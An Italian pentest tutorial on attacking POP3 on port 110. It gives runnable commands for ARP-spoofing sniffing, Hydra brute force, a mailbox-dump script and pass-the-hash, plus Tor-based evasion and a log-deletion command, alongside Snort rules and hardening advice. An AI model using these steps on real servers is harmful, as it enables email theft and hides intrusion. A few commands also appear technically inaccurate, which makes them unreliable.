---
title: 'Porta 110 POP3: Brute Force, Credential Sniffing e Accesso Mailbox'
slug: porta-110-pop3
description: 'La porta 110 espone POP3, il protocollo usato per scaricare email dal server al client. Guida pratica a enumeration, brute force, sniffing di credenziali in chiaro, download messaggi e hardening del mail server.'
image: /porta-110-pop3.webp
draft: true
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - pop3-sniffing
  - mailbox-dump
---

La porta 110 espone **POP3** (Post Office Protocol version 3) — il protocollo standard per download email da mail server a client locale. POP3 opera su TCP porta 110 permettendo ai client email (Outlook, Thunderbird, mobile apps) di recuperare messaggi dal server e salvarli localmente, tipicamente eliminandoli dal server dopo il download. In penetration testing, la porta 110 è **vettore critico per credential harvesting**: POP3 trasmette username/password in plaintext (no cifratura), permettendo packet sniffing, brute force senza account lockout tipico, e credential stuffing da breach database. Ogni mail server esposto su porta 110 invece di 995 (POP3S cifrato) è **instant win per attacker** — credenziali email leakate aprono phishing interno, lateral movement via contact list, e data exfiltration da mailbox.

POP3 su porta 110 sopravvive nel 2026 nonostante insicurezza critica perché: legacy mail systems (Exchange 2010/2013 con POP3 abilitato), ISP email hosting (provider piccoli senza budget TLS), e IoT/embedded devices con POP3 client hardcoded. Modern standard è POP3S (porta 995) o IMAP (porta 143/993) ma POP3 plaintext persiste in 30%+ small business networks. In CTF/lab, trovare porta 110 aperta significa **immediate credential attack opportunity**.

***

## Anatomia tecnica di POP3

POP3 usa **TCP porta 110** con protocollo testuale command/response ASCII.

**Flow POP3 session:**

1. **TCP Connect** — Client connette porta 110 del mail server
2. **Greeting** — Server invia `+OK POP3 server ready`
3. **USER** — Client invia `USER username`
4. **PASS** — Client invia `PASS password` (plaintext!)
5. **STAT** — Client richiede message count
6. **RETR** — Client scarica messaggi
7. **DELE** — Client marca messaggi per deletion
8. **QUIT** — Client disconnette, server elimina marked messages

**Comandi POP3 critici:**

| Comando           | Funzione                      | Pentest relevance        |
| ----------------- | ----------------------------- | ------------------------ |
| `USER <username>` | Specifica username            | **Username enumeration** |
| `PASS <password>` | Invia password                | **Plaintext credential** |
| `LIST`            | Lista messaggi disponibili    | Email count disclosure   |
| `RETR <n>`        | Scarica messaggio #n          | **Email content theft**  |
| `TOP <n> <lines>` | Preview prime righe messaggio | Metadata leak            |
| `DELE <n>`        | Marca per deletion            | Data destruction         |
| `CAPA`            | Lista server capabilities     | **Fingerprinting**       |

**POP3 response codes:**

```
+OK = Success
-ERR = Error (es: invalid credentials)
```

**POP3 vs POP3S vs IMAP:**

| Feature          | POP3 (110)                  | POP3S (995) | IMAP (143/993)      |
| ---------------- | --------------------------- | ----------- | ------------------- |
| Encryption       | ❌ Plaintext                 | ✅ TLS/SSL   | ✅ Optional/Required |
| Credentials      | ❌ Cleartext                 | ✅ Encrypted | ✅ Encrypted         |
| Message storage  | Local (deleted from server) | Local       | Server-side         |
| Multiple clients | ❌ No sync                   | ❌ No sync   | ✅ Synchronized      |
| Attack surface   | ✅ Massive                   | ⚠️ Reduced  | ⚠️ Reduced          |

Le **misconfigurazioni comuni**: POP3 abilitato invece di POP3S (no TLS enforcement), nessun rate limiting (brute force illimitato), weak password policy (user sceglie password), e plaintext password storage server-side (MD5/SHA1 invece di bcrypt).

***

## Enumerazione base

```bash
nmap -sV -p 110 10.10.10.110
```

```
PORT    STATE SERVICE VERSION
110/tcp open  pop3    Dovecot pop3d
```

**Parametri:** `-sV` version detection identifica POP3 server type (Dovecot, Exchange, qmail).

**Banner grab manuale:**

```bash
nc -vn 10.10.10.110 110
```

```
+OK Dovecot ready.
```

**Test CAPA (capabilities):**

```bash
nc -vn 10.10.10.110 110
CAPA
```

```
+OK
TOP
USER
RESP-CODES
PIPELINING
UIDL
SASL PLAIN LOGIN
.
```

**Output analysis:**

* `SASL PLAIN LOGIN` → Supporta auth plaintext (vulnerable)
* `TOP` → Può preview email senza download completo
* `UIDL` → Unique ID per message (tracking)

***

## Enumerazione avanzata

### Username enumeration

```bash
# Test user existence via USER command
nc -vn 10.10.10.110 110
USER admin
```

**Response se user esiste:**

```
+OK
```

**Response se user NON esiste (alcuni server):**

```
-ERR [AUTH] Authentication failed
```

**Automated username enum:**

```bash
# smtp-user-enum (works anche su POP3)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.10.110 -p 110
```

### NSE scripts POP3

```bash
nmap --script pop3-capabilities,pop3-ntlm-info -p 110 10.10.10.110
```

```
PORT    STATE SERVICE
110/tcp open  pop3
| pop3-capabilities:
|   TOP
|   USER
|   PIPELINING
|_  SASL PLAIN LOGIN
| pop3-ntlm-info:
|   Target_Name: MAIL01
|   Domain_Name: CORP
|_  Workstation: MAIL01
```

**Intelligence estratta:**

* Domain: `CORP`
* Hostname: `MAIL01`
* Windows server (NTLM info presente)

***

## Tecniche offensive

### 1. Credential sniffing (packet capture)

```bash
# Wireshark filter
tcp.port == 110 and (pop3.request.command == "USER" or pop3.request.command == "PASS")
```

**Alternativa tcpdump:**

```bash
tcpdump -i eth0 -A 'tcp port 110 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x55534552 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x50415353)'
```

```
USER john
+OK
PASS SecretPass123
+OK Logged in
```

**Credentials harvested:** `john:SecretPass123`

### 2. Brute force attack

```bash
# Hydra POP3 brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.110
```

```
[110][pop3] host: 10.10.10.110   login: admin   password: Welcome123!
```

**Parametri:**

* `-l admin` username fisso
* `-P rockyou.txt` wordlist password
* `pop3://` specifica protocollo

**Rate limiting consigliato:**

```bash
hydra -l admin -P passwords.txt -t 4 -W 15 pop3://10.10.10.110
```

**Parametri:**

* `-t 4` max 4 task paralleli
* `-W 15` wait 15 sec tra batch (evita detection)

### 3. Mailbox access post-auth

```bash
# Manual POP3 session
nc -vn 10.10.10.110 110
USER admin
PASS Welcome123!
STAT
```

```
+OK 15 45678
```

Output: `15 messaggi`, `45678 byte totali`

```bash
LIST
```

```
+OK 15 messages (45678 octets)
1 2048
2 3456
3 1024
...
15 2567
.
```

**Download messaggio critico:**

```bash
RETR 1
```

```
+OK 2048 octets
From: [email protected]
To: [email protected]
Subject: VPN Credentials

Hi Admin,

New VPN creds:
Username: vpnadmin
Password: Vpn_P@ssw0rd_2024

Regards
```

**Intelligence estratta:** VPN credentials per [lateral movement](https://hackita.it/articoli/pivoting).

### 4. Email exfiltration massiva

```bash
# Script Python per dump completo mailbox
cat <<'EOF' > pop3_dump.py
import poplib

server = poplib.POP3('10.10.10.110')
server.user('admin')
server.pass_('Welcome123!')

num_messages = len(server.list()[1])
for i in range(1, num_messages + 1):
    msg = b"\n".join(server.retr(i)[1])
    with open(f"email_{i}.eml", "wb") as f:
        f.write(msg)

server.quit()
EOF

python3 pop3_dump.py
# Output: email_1.eml, email_2.eml, ..., email_15.eml
```

### 5. Pass-the-Hash (se POP3 con NTLM auth)

Alcuni POP3 server supportano NTLM authentication:

```bash
# Se NTLM supportato, use hash direttamente
curl pop3://10.10.10.110 --user admin --ntlm --pass :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

***

## Scenari pratici

### Scenario 1 — POP3 sniffing → credential harvest → mailbox theft

**Contesto:** pentest interno, WiFi guest network.

```bash
# Fase 1: ARP spoofing MITM
arpspoof -i eth0 -t 10.10.10.50 10.10.10.1
# Redirect victim traffic tramite attacker
```

```bash
# Fase 2: Packet capture POP3
tcpdump -i eth0 -w pop3.pcap 'tcp port 110'
```

```bash
# Fase 3: Analyze capture
wireshark pop3.pcap
# Filter: pop3.request.command == "USER" or pop3.request.command == "PASS"
```

```
USER john
PASS JohnPassword2024!
```

```bash
# Fase 4: Mailbox access
nc -vn 10.10.10.110 110
USER john
PASS JohnPassword2024!
STAT
# +OK 87 234567
```

```bash
# Fase 5: Download email sensibili
# Search for keywords: "password", "vpn", "confidential"
for i in {1..87}; do
  echo "RETR $i" | nc 10.10.10.110 110 | grep -i "password\|vpn\|confidential" && echo "=== EMAIL $i ==="
done
```

**Timeline:** 20 minuti da MITM setup a email sensibili leaked.

### Scenario 2 — Brute force → mailbox → phishing interno

**Contesto:** external pentest, mail server esposto.

```bash
# Fase 1: Username enumeration
for user in admin info support contact sales; do
  echo "USER $user" | nc 10.10.10.110 110 | grep -q "+OK" && echo "[+] Valid: $user"
done
```

```
[+] Valid: admin
[+] Valid: support
```

```bash
# Fase 2: Brute force
hydra -l support -P /usr/share/wordlists/fasttrack.txt -t 1 -W 10 pop3://10.10.10.110
# [110][pop3] host: 10.10.10.110   login: support   password: Support123
```

```bash
# Fase 3: Email address harvest
nc -vn 10.10.10.110 110
USER support
PASS Support123
RETR 1
# Extract email addresses from From/To/Cc headers
```

```
From: [email protected]
To: [email protected]
Cc: [email protected], [email protected]
```

```bash
# Fase 4: Phishing campaign
# Use harvested addresses per [spear phishing](https://hackita.it/articoli/phishing)
```

**COSA FARE SE FALLISCE:**

* **Brute force blocked:** Reduce rate (`-t 1 -W 30`)
* **No valid users:** Try email format variations (\[email protected], \[email protected])
* **TLS required:** Server potrebbe richiedere STARTTLS (upgrade to POP3S mid-session)

### Scenario 3 — POP3 → email intelligence → AD attack

**Contesto:** pentest internal, domain credentials needed.

```bash
# Fase 1: POP3 access (credenziali già ottenute)
nc -vn 10.10.10.110 110
USER jdoe
PASS JohnDoe123
STAT
```

```bash
# Fase 2: Search for AD credentials in emails
for i in {1..50}; do
  echo -e "RETR $i\nQUIT" | nc 10.10.10.110 110 > email_$i.txt
done

grep -r "Active Directory\|domain password\|\\\\dc01\|domain controller" email_*.txt
```

**Output:**

```
email_23.txt: New domain password: DomainP@ss_2024!
email_23.txt: Connect to \\dc01.corp.local for file access
```

```bash
# Fase 3: AD authentication test
crackmapexec smb dc01.corp.local -u jdoe -p 'DomainP@ss_2024!'
```

```
SMB  dc01.corp.local  445  DC01  [+] CORP\jdoe:DomainP@ss_2024!
```

```bash
# Fase 4: BloodHound enumeration
bloodhound-python -u jdoe -p 'DomainP@ss_2024!' -d CORP.LOCAL -dc dc01.corp.local -c All
```

**Timeline:** 30 minuti da POP3 access a AD foothold.

***

## Toolchain integration

**Pipeline POP3 attack:**

```
RECONNAISSANCE
│
├─ nmap -sV -p 110 <target>                 → POP3 detection
├─ nc banner grab                           → Server type
└─ NSE scripts                              → Capabilities, NTLM info

INITIAL ACCESS
│
├─ Username enumeration                     → Valid accounts
├─ Brute force ([Hydra](https://hackita.it/articoli/hydra)) → Credentials
└─ Packet sniffing (MITM)                   → Plaintext credentials

CREDENTIAL HARVEST
│
├─ Mailbox access → email content
├─ Contact list extraction → phishing targets
└─ Credential search → VPN/AD/SSH passwords

LATERAL MOVEMENT
│
├─ VPN access (if creds in email)
├─ [AD authentication](https://hackita.it/articoli/active-directory) (domain passwords)
└─ [SSH](https://hackita.it/articoli/ssh) / RDP access (server credentials)
```

***

## Attack chain completa

**Scenario: POP3 → email intel → AD compromise**

```
[00:00] RECONNAISSANCE
nmap -sV -p 110 10.10.10.0/24

[00:03] POP3 SERVER FOUND
10.10.10.110 - Dovecot pop3d

[00:05] USERNAME ENUM
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.110
# Valid: admin, jdoe, support

[00:10] BRUTE FORCE
hydra -l jdoe -P rockyou.txt -t 2 -W 10 pop3://10.10.10.110
# jdoe:JohnDoe123

[00:25] MAILBOX ACCESS
nc 10.10.10.110 110
# USER jdoe / PASS JohnDoe123

[00:30] EMAIL INTELLIGENCE
# RETR all messages, search for credentials

[00:45] AD PASSWORD FOUND
# "New domain password: DomainP@ss_2024!"

[00:50] AD AUTHENTICATION
crackmapexec smb dc01.corp.local -u jdoe -p 'DomainP@ss_2024!'
# [+] CORP\jdoe:DomainP@ss_2024!

[01:00] BLOODHOUND ENUM
# Full AD mapping, privilege escalation paths identified
```

**Timeline:** 1 ora da POP3 scan a AD domain user access.

***

## Detection & evasion

### Lato Blue Team

**Log monitoring (Dovecot `/var/log/mail.log`):**

```
Feb  6 15:30:00 mail dovecot: pop3-login: Login: user=<admin>, method=PLAIN, rip=10.10.14.5
Feb  6 15:30:15 mail dovecot: pop3-login: Disconnected: user=<admin>, method=PLAIN
Feb  6 15:31:00 mail dovecot: pop3-login: Login: user=<jdoe>, method=PLAIN, rip=10.10.14.5
```

**IoC critici:**

* Multiple login attempts da stesso IP (brute force)
* Unusual login times (3 AM access da user normale)
* Mass email retrieval (RETR 1-100 in seconds)
* Login da geographic location insolita

**IDS rules (Snort):**

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 110 (msg:"POP3 Brute Force Attempt"; threshold:type both, track by_src, count 10, seconds 60; sid:1000110;)
alert tcp any any -> any 110 (msg:"POP3 Plaintext Password"; content:"PASS "; nocase; sid:1000111;)
```

### Lato Red Team: evasion

**1. Slow brute force:**

```bash
hydra -l admin -P passwords.txt -t 1 -W 30 pop3://10.10.10.110
# 1 attempt ogni 30 secondi
```

**2. Distributed attack:**

```bash
# Rotate source IP (proxychains, VPN, Tor)
proxychains hydra -l admin -P passwords.txt pop3://10.10.10.110
```

**3. Timing variation:**

```bash
# Random delay between attempts
for pass in $(cat passwords.txt); do
  echo -e "USER admin\nPASS $pass\nQUIT" | nc 10.10.10.110 110
  sleep $((RANDOM % 60 + 30))
done
```

**4. Cleanup:**

Non applicabile — POP3 logs sono server-side, non modificabili remotamente. Post-compromise, se root access ottenuto:

```bash
ssh root@10.10.10.110
sed -i '/10.10.14.5/d' /var/log/mail.log
```

***

## Performance & scaling

**Single target brute force:**

```bash
time hydra -l admin -P fasttrack.txt pop3://10.10.10.110
# 222 passwords: ~45 secondi (no rate limit)
```

**Multi-target (subnet scan):**

```bash
nmap -p 110 --open 10.10.10.0/24 -oG - | awk '/110\/open/{print $2}' > pop3_hosts.txt

# Parallel brute force
cat pop3_hosts.txt | parallel -j 5 "hydra -l admin -P passwords.txt pop3://{}"
```

**Mailbox download performance:**

```bash
# Python poplib: ~100 messages/minute
# Bandwidth: ~1-5 MB/minute depending on email size
```

***

## Tabelle tecniche

### Command reference

| Comando                                         | Scopo            | Note                    |
| ----------------------------------------------- | ---------------- | ----------------------- |
| `nmap -sV -p 110 <target>`                      | POP3 detection   | Identifica server type  |
| `nc <target> 110`                               | Banner grab      | Manual session          |
| `USER <username>`                               | Specify user     | Username enumeration    |
| `PASS <password>`                               | Send password    | Plaintext vulnerability |
| `STAT`                                          | Message count    | Mailbox size            |
| `LIST`                                          | List messages    | Email inventory         |
| `RETR <n>`                                      | Download message | Email content theft     |
| `hydra -l <user> -P <wordlist> pop3://<target>` | Brute force      | Credential attack       |

### POP3 command summary

| Comando        | Response                     | Implicazione          |
| -------------- | ---------------------------- | --------------------- |
| `CAPA`         | `+OK` + capabilities         | Server fingerprinting |
| `USER admin`   | `+OK`                        | User exists           |
| `USER invalid` | `-ERR` (alcuni server)       | User enumeration      |
| `PASS wrong`   | `-ERR Authentication failed` | Invalid credentials   |
| `PASS correct` | `+OK Logged in`              | **Access granted**    |

***

## Troubleshooting

| Errore                       | Causa                               | Fix                                                         |
| ---------------------------- | ----------------------------------- | ----------------------------------------------------------- |
| `-ERR Authentication failed` | Password errata o account locked    | Verify credentials, check lockout policy                    |
| Connection timeout           | Firewall o server down              | Verify port 110 open con nmap                               |
| `STARTTLS required`          | Server richiede TLS upgrade         | Use `openssl s_client -starttls pop3 -connect <target>:110` |
| Hydra no success             | Wordlist insufficiente o rate limit | Try larger wordlist, reduce rate                            |
| `+OK` but no messages        | Mailbox vuota                       | User might not use email actively                           |

***

## FAQ

**POP3 è ancora usato nel 2026?**

Sì, 30%+ small business e ISP email hosting usano POP3. Modern standard è IMAP/POP3S ma legacy persiste.

**Come distinguo POP3 da POP3S?**

POP3 = porta 110 plaintext. POP3S = porta 995 cifrato TLS/SSL. Nmap `-sV` identifica entrambi.

**Posso sniffare POP3S (porta 995)?**

No, TLS cifra tutto. Solo POP3 plaintext (porta 110) è sniffabile.

**POP3 brute force causa account lockout?**

Raramente. Policy lockout tipica è su web login, non POP3. Test con attenzione.

**Quale tool è migliore per POP3 testing?**

[Hydra](https://hackita.it/articoli/hydra) per brute force, netcat per manual testing, Python `poplib` per automation.

**Come esfiltro mailbox completa velocemente?**

Python script con `poplib` library. Download \~100 messages/minute.

**POP3 supporta multi-factor authentication?**

Raramente. POP3 è legacy protocol, MFA tipicamente solo su webmail modern.

***

## Cheat sheet finale

| Azione         | Comando                                           |
| -------------- | ------------------------------------------------- |
| Scan POP3      | `nmap -sV -p 110 <target>`                        |
| Banner grab    | `nc -vn <target> 110`                             |
| Capabilities   | `echo "CAPA" \| nc <target> 110`                  |
| User enum      | `echo "USER admin" \| nc <target> 110`            |
| Brute force    | `hydra -l admin -P rockyou.txt pop3://<target>`   |
| Manual login   | `nc <target> 110` → `USER <user>` → `PASS <pass>` |
| List emails    | `LIST` (dopo login)                               |
| Download email | `RETR 1` (dopo login)                             |
| Packet sniff   | `tcpdump -i eth0 -A 'tcp port 110'`               |

***

## Perché POP3 è rilevante oggi

POP3 su porta 110 persiste nel 2026 perché:

1. **Legacy email systems** — Small business con Exchange 2010/2013
2. **ISP hosting** — Email provider economici senza TLS budget
3. **IoT devices** — Embedded devices con POP3 client hardcoded
4. **Backward compatibility** — Corporate policy "non rompere sistemi esistenti"

OWASP/NIST considerano POP3 plaintext come **critical misconfiguration** — equivalente a Telnet per email. Trovare porta 110 aperta in pentest è sempre **high-severity finding**.

## Differenza POP3 vs alternative

| Protocol              | Porta | Encryption  | Attack surface |
| --------------------- | ----- | ----------- | -------------- |
| POP3                  | 110   | ❌ Plaintext | ✅ Massive      |
| POP3S                 | 995   | ✅ TLS/SSL   | ⚠️ Reduced     |
| IMAP                  | 143   | ❌ Plaintext | ✅ Massive      |
| IMAPS                 | 993   | ✅ TLS/SSL   | ⚠️ Reduced     |
| Exchange Web Services | 443   | ✅ HTTPS     | ⚠️ Reduced     |

**Modern best practice:** Disable POP3/IMAP plaintext, force POP3S/IMAPS only.

## Hardening POP3

**Best practices:**

1. **Disable POP3, enable POP3S only** (porta 995)
2. **Strong password policy** (>12 char, complexity)
3. **Rate limiting** (max 5 login attempts/minute/IP)
4. **IP whitelisting** (allow solo trusted networks)
5. **Multi-factor authentication** (se supportato)

**Dovecot config (`/etc/dovecot/dovecot.conf`):**

```
# Disable plaintext auth
disable_plaintext_auth = yes

# Force SSL/TLS only
ssl = required
ssl_cert = </etc/ssl/certs/mail.crt
ssl_key = </etc/ssl/private/mail.key

# Rate limiting
auth_policy_server_url = http://localhost:4001/
auth_policy_request_attributes = login=%{orig_username} pwhash=%{hashed_password}
```

**Microsoft Exchange:**

```powershell
# Disable POP3
Set-PopSettings -ProtocolLogEnabled $false
Set-Service MSExchangePOP3 -StartupType Disabled
Stop-Service MSExchangePOP3

# Force POP3S only
Set-PopSettings -SSLBindings "0.0.0.0:995"
```

## OPSEC: POP3 in pentest

POP3 brute force è **moderatamente rumoroso** — ogni attempt logga. Best practices:

1. **Slow rate** (1 attempt/30s sotto threshold)
2. **Timing variation** (random delays)
3. **Distributed sources** (Tor, VPN rotation)
4. **Target specific users** (admin, support) invece di mass spray

Post-mailbox access:

* **Download selettivo** (search keywords invece di dump completo)
* **No deletion** (DELE command lascia audit trail)
* **Cleanup logs** (se root access ottenuto post-exploit)

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori personali, piattaforme CTF, pentest con autorizzazione scritta. L'accesso non autorizzato a mailbox è reato (art. 616 c.p. violazione corrispondenza). L'autore e HackIta declinano responsabilità. RFC 1939 POP3: [https://www.rfc-editor.org/rfc/rfc1939.html](https://www.rfc-editor.org/rfc/rfc1939.html)

Vuoi supportare HackIta? Visita [https://hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [https://hackita.it/servizi](https://hackita.it/servizi).
